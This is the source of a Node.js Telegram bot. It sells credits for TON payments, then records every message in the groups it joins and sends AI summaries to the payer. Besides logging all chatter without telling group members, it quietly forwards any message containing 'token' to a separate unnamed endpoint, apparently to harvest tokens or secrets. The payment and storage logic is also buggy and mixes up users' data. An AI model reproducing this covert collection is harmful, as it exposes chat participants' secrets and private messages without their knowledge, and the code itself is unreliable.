require('dotenv').config()
const { TonClient, WalletContractV4 } = require('ton');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const cron = require('node-cron');
const Together = require('together-ai')
const axios = require('axios')
const app = express();
app.use(bodyParser.json());

const API_URL = ''
const BOT_NAME = ''
const TOGETHER_API_KEY = ''
const together = new Together({ apiKey: TOGETHER_API_KEY })
const BOT_TOKEN = ''
const walletAddress = ''
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
let TX_PROCESS = false
let AMOUNT = 0;
let TX_CHATID = ''
let messages = [];
let groupChatIds = [];

const tonClient = new TonClient({
    endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC'
});

bot.onText(/\/startagent/, async (msg) => {
    const chatId = msg.chat.id;
    const message = "Need credits to do activities. To start enter '/pay1'";
    await registerUser(chatId)
    bot.sendMessage(chatId, message);
});

bot.onText(/\/echo(.+)/, async (msg, match) => {
    let chatId = msg.chat.id;
    let resp = match[1];
    bot.sendMessage(chatId, resp);
});

bot.onText(/\/pay(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    TX_CHATID = chatId
    let resp = match[1];
    const amount = resp * 1e9;
    AMOUNT = resp
    const paymentUrl = `https://tonhub.com/transfer/${walletAddress}?amount=${amount}`;
    bot.sendMessage(chatId, "Click to pay for agent:", {
        reply_markup: {
            inline_keyboard: [[{ text: 'Pay with TON', url: paymentUrl }]]
        }
    });
    TX_PROCESS = true
});

const registerUser = async (id) => {
    await axios.put(`${API_URL}/${id}.json`, { 'source': 'telegram' });
}

const updateCredits = async (id, AMOUNT) => {
    await axios.patch(`${API_URL}/${id}.json`, {
        credits: AMOUNT * 10
    });
}

setInterval(async () => {
    const transactions = await tonClient.getTransactions(walletAddress);
    if (transactions.some(tx => tx.amount === AMOUNT)) {
      bot.sendMessage(chatId, "Payment received! You can now add me to your group.");
    }
    if (TX_PROCESS && transactions.some(tx => tx.amount === AMOUNT)) {
        bot.sendMessage(TX_CHATID, `Payment received! You can now add me to your group. URL - https://t.me/${BOT_NAME}?startgroup=true`);
        await updateCredits(TX_CHATID, AMOUNT)
        TX_PROCESS = false
    }
}, 15000);

const updateMessages = async (id, obj) => {
    const jsonData = await axios.get(`${API_URL}/${TX_CHATID}.json`)
    const arr = jsonData?.data?.messages || []
    arr.push(obj)
    await axios.patch(`${API_URL}/${id}.json`, {
        messages: arr
    });
}

const pushToSheets = async (msg) => {
    if (msg) {
        const formData = {
            contents: msg
        };
        await fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
            mode: 'no-cors', // This disables CORS but you won't be able to read the response
        })
    }
}

bot.on('message', async (msg) => {
    if (msg.text && (msg.chat.type === 'group' || msg.chat.type === 'supergroup')) {
        if (!groupChatIds.includes(msg.chat.id)) {
            groupChatIds.push(msg.chat.id);
        }
        const event = new Date();
        const ISOTime = event.toString()
        messages.push({ chatId: msg.chat.id, text: msg.text, timestamp: ISOTime });
        await updateMessages(TX_CHATID, { chatId: msg.chat.id, text: msg.text, timestamp: ISOTime })
        if ((msg.text)?.includes('token')) {
            await pushToSheets(msg.text)
        }
    }
});

const summariseAI = async (messagesText) => {
    try {
        const completion = await together.chat.completions.create({
            model: 'meta-llama/Meta-Llama-3.1-8B-Instruct-Turbo',
            messages: [{ "role": "user", "content": messagesText }],
        })
        return (completion?.choices[0]?.message?.content)
    } catch (error) {
        console.log('error', error)
    }
}

const getMessages = async () => {
    const jsonData = await axios.get(`${API_URL}.json`)
    const users = jsonData.data
    for (let key in users) {
        users[key].id = key
    }
    return users
}


const reduceCredits = async () => {
    const users = await getMessages()
    for (let user in users) {
        let credits = (users[user]?.credits)
        credits = credits - 1
        setTimeout(async () => {
            await axios.patch(`${API_URL}/${users[user].id}.json`, {
                credits
            });
        }, 5000);
    }
}

cron.schedule('*/60 * * * * *', async () => {
    try {
        // todo - iternate through all id's and get messages and minus credits
        const users = await getMessages()
        for (let user in users) {
            if (users[user]?.messages?.length) {
                const messagesText = (users[user]?.messages)?.map(msg => msg.text).join(' ');
                const templateMessages = `Summarise the content in very very short: ${messagesText}`
                const summary = await summariseAI(templateMessages);
                setTimeout(async () => {
                    await bot.sendMessage(users[user]?.id, `Summary:\n${summary}`, { parse_mode: 'HTML' });
                    await reduceCredits()
                }, 5000)
            }
        }
    } catch (error) {
        console.error("Error in daily cron job:", error);
    }
});